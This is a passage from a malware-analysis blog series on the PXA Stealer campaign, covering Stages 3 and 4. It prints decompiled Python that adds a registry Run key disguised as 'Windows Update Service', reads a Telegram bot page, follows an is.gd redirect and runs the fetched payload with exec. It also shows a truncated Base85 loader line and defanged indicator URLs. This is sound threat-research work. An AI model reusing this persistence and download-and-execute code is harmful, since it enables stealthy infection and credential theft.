</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">unique_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Persistence via registry</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">winreg</span><span class="o">.</span><span class="n">OpenKey</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">winreg</span><span class="o">.</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="sa">r</span><span class="s2">&#34;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">winreg</span><span class="o">.</span><span class="n">KEY_SET_VALUE</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">command</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;cmd /c start &#39;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="s1">&#39;%PUBLIC%&#39;</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">            <span class="sa">r</span><span class="s1">&#39;\Windows\svchost.exe C:\Users\Public\Windows\Lib\images.png &#39;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">winreg</span><span class="o">.</span><span class="n">SetValueEx</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Windows Update Service&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">winreg</span><span class="o">.</span><span class="n">REG_SZ</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">command</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">winreg</span><span class="o">.</span><span class="n">CloseKey</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Get the Telegram page</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://t.me/&#39;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;meta property=&#34;og:description&#34; content=&#34;([^&#34;]+)&#34;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Follow the is.gd redirect</span>
</span></span><span class="line"><span class="cl">        <span class="n">short_id</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">final_url</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="s1">&#39;https://is.gd/&#39;</span> <span class="o">+</span> <span class="n">short_id</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">url</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">final_url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Execute downloaded code</span>
</span></span><span class="line"><span class="cl">        <span class="n">exec</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Retry logic (loops back in bytecode)</span></span></span></code></pre></div></div>
<p>It first checks for the existence of a <strong>very specific folder</strong> in <code>C:\Users\Public</code>.<br>
This is most likely used as an <strong>infection checker</strong> possibly to act as a <strong>kill switch</strong> if later stages have been executed.</p>
<p>As we continue reviewing the code, we find confirmation:<br>
It sets a <strong>registry Run key</strong> named <code>Windows Update Service</code> with the following command:</p>
<p><code>cmd /c \\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png &lt;sys.argv[1]&gt;</code></p>
<p>If you remember from Stage 2, this points to the Python executable and the initial script, effectively re-launching the malware on reboot.</p>
<p>Further down, we find a <strong>regex search</strong> applied to the results of a <code>GET</code> request made to a <strong>Telegram server</strong>.</p>
<p>I&rsquo;m going to pull out and isolate this section next for a more detailed analysis.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  182 LOAD_NAME                1 (re)
</span></span><span class="line"><span class="cl">  184 LOAD_METHOD             22 (search)
</span></span><span class="line"><span class="cl">  186 LOAD_CONST              12 (&#39;&lt;meta property=&#34;og:description&#34; content=&#34;([^&#34;]+)&#34;&#39;)
</span></span><span class="line"><span class="cl">  188 LOAD_NAME                0 (requests)
</span></span><span class="line"><span class="cl">  190 LOAD_METHOD             23 (get)
</span></span><span class="line"><span class="cl">  192 LOAD_CONST              13 (&#39;https://t.me/&#39;)
</span></span><span class="line"><span class="cl">  194 LOAD_NAME                3 (sys)
</span></span><span class="line"><span class="cl">  196 LOAD_ATTR               20 (argv)</span></span></code></pre></div></div>
<p>The regex search is targeting a very specific HTML pattern, which looks like this:
<code>&lt;meta property=&quot;og:description&quot; content=&quot;</code>&hellip;some text here&hellip;<code>&quot;&gt;</code></p>
<p>The full URI took some work to uncover. It’s derived by accessing an attribute passed via <code>sys.argv</code>.</p>
<p>After some frustration, I recalled the string we saw all the way back in <strong>Stage 2</strong>:
<code>ADN_UZJomrp3vPMujoH4bot</code></p>
<p>This was passed into stage 2 as an argument and it turns out this string is the <strong>missing part</strong> of the Telegram URL, which forms:
<code>https://t[.]me/ADN_UZJomrp3vPMujoH4bot</code></p>
<p>Sending a <code>curl</code> request to that Telegram URL reveals a large HTML file but the key part is:
<code>&lt;meta property=&quot;og:description&quot; content=&quot;s5xknuj2&quot;&gt;</code>
The regex matches on that <code>content</code> value in this case, <strong><code>s5xknuj2</code></strong>.</p>
<p>That matched value becomes the key input in a second <code>GET</code> request to <code>is.gd</code>, which is used as a <strong>URL shortener</strong> to retrieve more code for execution.</p>
<p>The logic in disassembled form looks like this:</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  218 LOAD_NAME               26 (exec)
</span></span><span class="line"><span class="cl">  222 LOAD_METHOD             23 (get)
</span></span><span class="line"><span class="cl">  224 LOAD_NAME                0 (requests)
</span></span><span class="line"><span class="cl">  226 LOAD_ATTR               27 (head)
</span></span><span class="line"><span class="cl">  228 LOAD_CONST              14 (&#39;https://is.gd/&#39;)
</span></span><span class="line"><span class="cl">  230 LOAD_NAME               25 (match)
</span></span><span class="line"><span class="cl">  232 LOAD_METHOD             28 (group)</span></span></code></pre></div></div>
<p>This short, obfuscated redirection flow makes the malware <strong>harder to trace</strong> and gives the attacker flexibility to <strong>update payloads dynamically</strong> all without modifying the original lure. They simply <strong>update the description</strong> on their Telegram bot.</p>
<hr>
<p>If we curl <code>https://is[.]gd/s5xknuj2</code> it redirects us to <code>https://paste[.]rs/fVmzS</code></p>
<p>… it starts the entire process over again delivering a <strong>new payload</strong> with the same overall structure as Stage 2, but with a <strong>different Base85 string</strong>:
<code>exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(&quot;c$|c~*|PFlk|y|1XNVIgA|vOF$g0Ys7&gt;c3......&quot;))))</code></p>
<p>Welcome to Stage 5. But before we dive in, let’s take a quick breather and recap what we’ve covered so far.&quot;</p>
<hr>
<p>Quick Recap: What Have We Found?</p>
<p>What began as a <strong>simple phishing lure</strong> evolved into a <strong>multi-stage Python malware chain</strong> featuring:</p>
<ul>
<li><strong>DLL side-loading</strong></li>
<li>Execution of <strong>Python bytecode</strong> via Base85-encoded payloads</li>
<li>Multiple layers of <strong>encryption and obfuscation</strong></li>
<li><strong>Persistence</strong> via Windows Registry</li>
<li>A clever use of <strong>Telegram bot metadata</strong> to fetch commands</li>
<li>And finally, redirection through URL shorteners to dynamically update payloads</li>
</ul>
<p>Each layer was designed to evade detection, frustrate analysis, and allow the attacker to push new stages without modifying the earlier ones.</p>
<hr>

<h2 class="relative group">Up Next: Stage 5 – Analysing the Payload
    <div id="up-next-stage-5--analysing-the-payload" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#up-next-stage-5--analysing-the-payload" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>In <strong>Part 3</strong>, we shift our attention to the <strong>fifth and final Python stage</strong>, a fully fledged <strong>information stealer</strong>. We’ll uncover:</p>
<ul>
<li>Credential harvesting from Chrome and Firefox</li>
<li>Extraction of cookies, credit cards, 2FA tokens, and more</li>
<li>AV enumeration using Windows Management Instrumentation (WMI)</li>
<li>Clever exfiltration via Telegram bots</li>
<li>Indicators suggesting links to the PXA Stealer family</li>
</ul>
<p>This is where the campaign reveals its true intent not just execution, but exploitation. Get ready for the deep dive into the <strong>weaponised payload</strong>.</p>

          
          
          
            <strong class="block mt-8">
              <a
                target="_blank"
                class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
                href="mailto:james.northey@proton.me?subject=Reply%20to%20PXA%20Stealers%20Evolution%20to%20PureRAT%3a%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20%26%204%29">
                Reply by Email
              </a>
            </strong>
          
        </div>
        
          
  
  
  
  
  
  

  

  
    
    
<div class="flex author">
  
    
    
      
    
    
      
      
      
        
        
        
      
      <img
        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
        width="96"
        height="96"
        alt="Darkrym"
        src="/img/avatar_hu_6d6844644fe0d13b.png"
        data-zoom-src="/img/avatar_hu_975dafa9001db883.png">
    
  
  <div class="place-self-center">
    
      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        Darkrym
      </div>
    
    
      <div class="text-sm text-neutral-700 dark:text-neutral-400">SOC Analyst @HuntressLabs | Malware Junkie</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="james.northey@proton.me"
          target="_blank"
          aria-label="Email"
          title="Email"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/Darkrym"
          target="_blank"
          aria-label="Github"
          title="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://www.linkedin.com/in/j-northey/"
          target="_blank"
          aria-label="Linkedin"
          title="Linkedin"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://x.com/darkrym11"
          target="_blank"
          aria-label="Twitter"
          title="Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span></a
        >
      
    
  </div>

</div>
  </div>
</div>

  

  

  
    <div class="mb-10"></div>
  

        
        
  <details class="mt-2 mb-5 overflow-hidden rounded-lg ms-0 ps-5">
    
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 -ms-5 ps-5 dark:bg-primary-800 dark:text-neutral-100">
    PXA Stealer -
    This article is part of a series.
  </summary>
  
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part1/">
          Part 1:
          PXA Stealers Evolution to PureRAT: Part 1 - Basics of Python Reversing &amp; Static Analysis (Stage 1 &amp; 2)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        Part 2:
        This Article
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part3/">
          Part 3:
          PXA Stealers Evolution to PureRAT: Part 3 - Weaponised Python Stage (Stage 5)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part4/">
          Part 4:
          PXA Stealers Evolution to PureRAT: Part 4 - .NET Payload Analysis (Stage 6 &amp; 7)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part5/">
          Part 5:
          PXA Stealers Evolution to PureRAT: Part 5 - Another Shift in Tactics (Stage 8)
        </a>
      </div>
    
  
    
      <div
        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
        <a href="/posts/python_malware_part6/">
          Part 6:
          PXA Stealers Evolution to PureRAT: Part 6 - Finally, the Final Stage PureRAT (Stage 9)
        </a>
      </div>
    
  


  </details>


        
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/posts/python_malware_part2/&amp;title=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Share on LinkedIn"
          aria-label="Share on LinkedIn">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://twitter.com/intent/tweet/?url=//localhost:1313/posts/python_malware_part2/&amp;text=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Tweet on Twitter"
          aria-label="Tweet on Twitter">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://api.whatsapp.com/send?text=//localhost:1313/posts/python_malware_part2/&amp;resubmit=true&amp;title=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Share via WhatsApp"
          aria-label="Share via WhatsApp">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://pinterest.com/pin/create/bookmarklet/?url=//localhost:1313/posts/python_malware_part2/&amp;description=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Pin on Pinterest"
          aria-label="Pin on Pinterest">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://reddit.com/submit/?url=//localhost:1313/posts/python_malware_part2/&amp;resubmit=true&amp;title=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Submit to Reddit"
          aria-label="Submit to Reddit">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.facebook.com/sharer/sharer.php?u=//localhost:1313/posts/python_malware_part2/&amp;quote=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Share on Facebook"
          aria-label="Share on Facebook">
